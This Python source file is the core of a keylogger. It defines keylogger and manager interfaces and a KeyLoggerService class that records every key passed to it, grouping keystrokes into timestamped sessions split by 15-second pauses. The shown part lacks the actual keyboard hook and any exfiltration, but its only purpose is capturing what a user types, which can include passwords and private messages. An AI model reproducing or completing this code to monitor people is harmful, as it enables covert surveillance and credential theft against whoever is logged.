from abc import ABC, abstractmethod
from typing import List
import time

import ToolBox


class Write(ABC):
    @abstractmethod
    def write(self):
        pass

class IKeyLogger(ABC):
    @abstractmethod
    def on_press(self,key) -> None:
        pass
    @abstractmethod
    def get_logged_keys(self) -> dict[str:str]:
        pass
class IKeyLoggerManager(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass
    @abstractmethod
    def stop_logging(self) -> None:
        pass


class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.__logged_keys = {}
        self.__last_key = ""
        self.__last_type_time = None

    def on_press(self, key) -> None:
        key = ToolBox.format_key(key)
        current_time = time.time()
        current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))

        if self.__last_type_time is None or current_time - self.__last_type_time >= 15:
            self.__last_key = current_time_formatted

        self.__last_type_time = current_time

        if self.__last_key not in self.__logged_keys:
            self.__logged_keys[self.__last_key] = ""

        self.__logged_keys[self.__last_key] += key

    def get_logged_keys(self) -> dict[str:str]:
        return self.__logged_keys

